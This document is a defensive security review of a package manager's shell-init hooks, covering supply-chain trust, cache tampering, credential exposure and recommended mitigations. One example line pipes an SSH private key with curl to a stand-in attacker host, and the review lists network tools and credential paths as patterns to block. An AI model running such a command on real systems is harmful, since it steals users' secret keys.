# Security Review: tool-lifecycle-hooks

## Dimension Analysis

### External Artifact Handling

**Applies:** Yes

The `install_shell_init` action introduces two paths for external artifacts to influence shell sessions:

**`source_command` path:** This executes the installed tool's binary (e.g., `niwa shell-init bash`) and captures its stdout as a shell init script. The output is written to `$TSUKU_HOME/share/shell.d/{target}.{shell}` with no validation of what the command emits. A compromised binary can output arbitrary shell code that gets sourced in every future shell session. The design acknowledges this ("though it's the tool's own binary, already trusted by installing it") but understates the risk: the binary was trusted to perform its stated function, not to generate arbitrary shell code that persists and runs repeatedly.

**`source_file` path:** Copies a file from the downloaded archive into shell.d. This is somewhat safer since the file content is fixed at download time and could theoretically be reviewed in the recipe PR. However, the content is still opaque shell code that reviewers may not scrutinize thoroughly.

**Severity:** High. The `source_command` variant is particularly concerning because the output is dynamic -- it can vary between installations, making PR review of the recipe insufficient. A tool binary that passes checksum validation at download time can still generate different init script content based on environment detection (e.g., checking for SSH keys, cloud credentials, or CI environments before deciding what to output).

**Specific risks:**
1. A tool binary generates benign init output during testing but includes exfiltration logic when it detects production-like environments (SSH agent sockets, AWS credential files, GPG keyrings).
2. A tool update ships a binary that generates init scripts with a backdoor. The recipe didn't change, so there's no PR review trigger -- the binary just started emitting different output.
3. The `{shell}` template substitution in `source_command` is the only variable, but the command string itself comes from the recipe TOML. A malicious recipe could set `source_command` to something unrelated to shell init (e.g., `cat ~/.ssh/id_rsa | curl -d @- https://evil.example`). The design doesn't describe validation that the command actually invokes the tool being installed.

**Mitigations:**
- Validate that `source_command` begins with the tool's own binary name (prevent arbitrary command execution via recipe field).
- Add content validation on the output: reject scripts that contain network commands (`curl`, `wget`, `nc`), credential file paths (`~/.ssh`, `~/.gnupg`, `~/.aws`), or known exfiltration patterns.
- Log `source_command` output to a reviewable location so users can inspect what was written to shell.d.
- Consider a `--dry-run` flag for `install_shell_init` that shows what would be written without sourcing it.
- For `source_file`, validate the file exists within the tool's install directory (path traversal prevention, which the design already does for other paths).

### Permission Scope

**Applies:** Yes

Shell.d scripts sourced via `eval "$(tsuku shellenv)"` run with the user's full interactive shell privileges. This is by design -- shell init scripts need to modify the shell environment. But this means a malicious shell.d script has access to everything the user can access: SSH keys, API tokens in environment variables, browser profiles, password managers, cloud credentials, and the ability to modify PATH to intercept commands.

**Severity:** Critical. The init cache is a single file (`.init-cache.{bash,zsh}`) that concatenates all per-tool scripts. Compromising this one file gives an attacker persistent access to every new shell session. The atomic write mechanism protects against partial writes but doesn't protect the cache itself from being a high-value target.

**Specific risks:**
1. The cache file (`.init-cache.bash`) is a single point of compromise. If an attacker can write to this file (via a compromised tool's `source_command` output, a race condition during cache rebuild, or direct filesystem access), they gain persistent shell access.
2. Shell.d scripts execute in the user's login shell context, which typically has access to SSH agent, GPG agent, cloud CLI credentials, and browser session cookies. A function definition in shell.d could alias common commands (`ssh`, `git push`, `aws`) to intercept credentials.
3. The design specifies alphabetical ordering for cache concatenation. This means a tool named `aaa-helper` would have its init script execute before all others, potentially intercepting or modifying behavior of subsequent init scripts.

**Mitigations:**
- Set restrictive file permissions on shell.d directory and cache files (0700 for directory, 0600 for files).
- Add integrity checking: `tsuku doctor` should verify cache content matches the concatenation of individual shell.d files (detect tampering).
- Consider signing the cache file with a local key so `tsuku shellenv` can verify integrity before sourcing.
- Document the risk clearly: users who add `eval "$(tsuku shellenv)"` to their rc files should understand that installed tools can now influence their shell environment.

### Supply Chain or Dependency Trust

**Applies:** Yes

This is the most significant security dimension. The design creates a new supply chain attack surface that didn't exist before.

**Current state:** Recipes are community-contributed TOML files. The `source_command` field lets a recipe author specify which command generates init scripts. The recipe PR review is the primary security control. But `source_command` creates a gap in this model: the recipe is reviewed, but the *output* of the command it specifies is not.

**Severity:** Critical. The design changes tsuku's trust model from "we trust recipes to declare correct download-and-symlink steps" to "we trust recipes to declare commands whose runtime output is safe to source in every shell session." This is a qualitative shift in what trust means.

**Specific risks:**
1. **Recipe-level attack:** A contributor submits a recipe with `source_command = "tool init {shell}"` which looks legitimate. The tool binary is downloaded from a legitimate-looking GitHub release. But the binary's `init` subcommand outputs shell code that exfiltrates `$HOME/.ssh/id_rsa`. The recipe reviewer sees the TOML and it looks normal. The binary output is never reviewed.
2. **Upstream compromise:** A legitimate tool's repository is compromised. A new release ships a binary where `tool init bash` now includes malicious code. tsuku's checksum validation passes (the checksum matches the new release). The recipe hasn't changed, so there's no PR review. The malicious init script silently appears in users' shells on next `tsuku update`.
3. **Cache as amplifier:** Because the cache concatenates all scripts, a single compromised tool's init script runs alongside every other tool's init. If the malicious script redefines shell builtins (`cd`, `source`, `eval`), it can intercept all subsequent tool init scripts too.
4. **TOCTOU in cache rebuild:** The design specifies that cache rebuild happens after shell.d files are written. Between writing a shell.d file and rebuilding the cache, another process (or a concurrent `tsuku install`) could modify the shell.d file. The atomic write of the cache doesn't help if the source files were tampered before concatenation.

**Mitigations:**
- **Content hashing:** After `source_command` runs, hash its output and store the hash in state.json. On cache rebuild, verify all shell.d files match their stored hashes. Detect tampering between install and sourcing.
- **First-install review prompt:** The first time a tool with `install_shell_init` is installed, show the user what will be written to shell.d and ask for confirmation (similar to Chocolatey's consent model). Subsequent updates could diff the old and new output.
- **Restrict `source_command` to tool binary:** Validate that the command invokes only the tool's own installed binary (not arbitrary commands). Parse the command string and verify the first token resolves to a binary in the tool's install directory.
- **Lock file for shell.d:** Use file locking during cache rebuild to prevent TOCTOU races with concurrent installs.
- **`--no-shell-init` flag:** Allow users to install tools without running `install_shell_init`, giving them the option to inspect and manually set up shell integration.

### Data Exposure

**Applies:** Yes

Shell init scripts run in the interactive shell environment, which is the richest data context available to a userspace process.

**Severity:** High. The exposure surface includes:

1. **Environment variables:** Shell init scripts can read and modify all environment variables. Many tools store API keys, tokens, and secrets in env vars (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `ANTHROPIC_API_KEY`). A malicious init script can silently exfiltrate these.
2. **Shell history:** Init scripts can modify `PROMPT_COMMAND` (bash) or `precmd` (zsh) to log all commands the user types, including passwords entered on the command line.
3. **File system access:** Init scripts run with the user's full file permissions. They can read `~/.ssh/*`, `~/.gnupg/*`, `~/.aws/credentials`, browser profiles, and any other user-accessible file.
4. **Process interception:** An init script can alias or wrap common commands (`git`, `ssh`, `docker`, `kubectl`) to intercept credentials or modify behavior before passing through to the real command.
5. **Persistence:** Because shell.d scripts are sourced on every new shell, a malicious script has persistent access without needing any additional persistence mechanism. Removing it requires either `tsuku remove` for the offending tool or manual deletion of the shell.d file.

**Mitigations:**
- Static analysis of shell.d output: scan for patterns that access credential paths, modify `PROMPT_COMMAND`/`precmd`, define aliases for security-sensitive commands, or perform network operations.
- Provide `tsuku shell-audit` command that displays all active shell.d scripts with their content, so users can inspect what's being sourced.
- Document that `install_shell_init` tools have elevated trust requirements compared to binary-only tools.

## Recommended Outcome

**Option 2: Approve with required changes.**

The design solves a real problem (8-12 tools need shell integration) and the Level 1 declarative approach is the right starting point. However, the `source_command` variant introduces a significant trust model shift that the design underestimates. The design treats `source_command` execution as equivalent to the user running the command manually, but there's a critical difference: manual execution is one-time and visible, while shell.d sourcing is persistent and invisible.

Required changes before implementation:

1. **Restrict `source_command` to the tool's own binary.** Parse the command template and verify the executable resolves to a binary within the tool's install directory. Reject recipes where `source_command` invokes arbitrary commands.

2. **Add output validation for shell.d content.** Scan `source_command` output for high-risk patterns (network commands, credential file paths, shell built-in overrides) before writing to shell.d. This doesn't need to be perfect -- it's a defense-in-depth layer alongside PR review.

3. **Store content hashes in state.** Record the SHA-256 of each shell.d file at write time. Verify hashes during cache rebuild. This detects post-install tampering and TOCTOU races.

4. **Add `tsuku shell-audit` or extend `tsuku doctor`.** Give users visibility into what's being sourced in their shell. The cache file is opaque by design (for performance); there needs to be a way to inspect it.

5. **File locking during cache rebuild.** Prevent concurrent installs from creating race conditions in the shell.d directory.

6. **Document the trust model change.** Recipe authors and users should understand that tools with `install_shell_init` have a higher trust requirement than binary-only tools. Consider a recipe metadata field (e.g., `shell_integration = true`) that makes this visible during `tsuku info`.

The `source_file` variant is lower risk and could ship first, with `source_command` gated behind the additional validations above.

## Summary

The tool-lifecycle-hooks design introduces a meaningful trust model shift by allowing installed tool binaries to generate shell code that runs persistently in every user shell session. The `source_command` variant is the primary concern: it creates a gap between what recipe reviewers can see (the TOML command template) and what actually executes (the binary's runtime output), and a compromised upstream binary can inject malicious shell code without any recipe change triggering re-review. The design should ship with `source_command` restricted to the tool's own binary, output content validation, content hash verification in state, and user-facing audit tooling -- these changes preserve the feature's utility while closing the most exploitable gaps.
